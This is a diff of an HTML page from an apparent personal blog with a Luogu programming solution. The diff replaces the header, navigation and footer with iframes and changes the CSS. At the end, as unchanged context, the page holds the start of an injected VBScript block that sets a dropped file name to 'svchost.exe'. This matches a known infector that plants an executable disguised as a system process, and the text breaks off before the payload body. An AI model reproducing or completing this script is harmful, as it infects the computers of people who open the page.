@@ -6,17 +6,13 @@
 <link rel="icon" href="images/icon.ico">
 <body>
 
-<div id="header">
-<p>YRC的BLOG</p>
-</div>
-
-<div id="tree">
-<a href="index.html"><img src="images/home.png" height="70" width="70" alt="首页"/></a><br>
-<a href="article.html"><img src="images/article.png" height="70" width="70" alt="文章"/></a><br>
-<a href="team.html"><img src="images/team.png" height="70" width="70" alt="团队"/></a><br>
-</div>
+<iframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src="header.html" height="6%" width="100%"></iframe>
+<hr color="#2ECCFA"/>
 
 <div id="main">
+
+<div id="t">
+
 <h2>洛谷题解 P3152 【正整数序列】</h2>
 <hr>
 <p>其实为什么要递归，直接整除除就好了</p>
@@ -45,46 +41,30 @@ int main()
 题目详见:https://www.luogu.org/problem/show?pid=3152
 </p>
 </div>
-
-<div id="footer">
-Copyright dgsyrc.github.io<br/>
-update on 2018-08-09<br/>
- <br/>
 </div>
 
+<iframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src="footer.html" height="8%" width="100%"></iframe>
 </body>
 <style>
-#header {
-    height:50px;
-	font-size:18px;
-    font-weight:bold;
-    background-color:#00BFFF;
-    color:white;
-    text-align:center;
-	line-height:50px;
-}
-#tree {
-    line-height:30px;
-    background-color:#eeeeee;
-    height:99%;
-    width:70px;
-    float:left;
-    padding:5px; 
-}
 #main {
-    height:98%;
-    width:94%;
-    float:left;
-    padding:10px;  
-	float:center;
-	background-image:url(images/luogu.jpg);	
+    height:96%;
+    width:100%;
+    float:center;
+	background:url("images/art2.jpeg")no-repeat center center;
+	background-size:cover;
 }
-#footer {
-    background-color:black;
-    color:white;
-    clear:both;
-    text-align:center;
-    padding:5px; 
+#t {
+   background-color:rgba(255,255,255,0.8);
+   text-align:left;
+   padding:10px;
+   width:60%;
+   height:auto;
+   float:center;
+   margin:auto;
+   top: 0;
+   left: 0;
+   right: 0;
+   bottom: 0;
 }
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
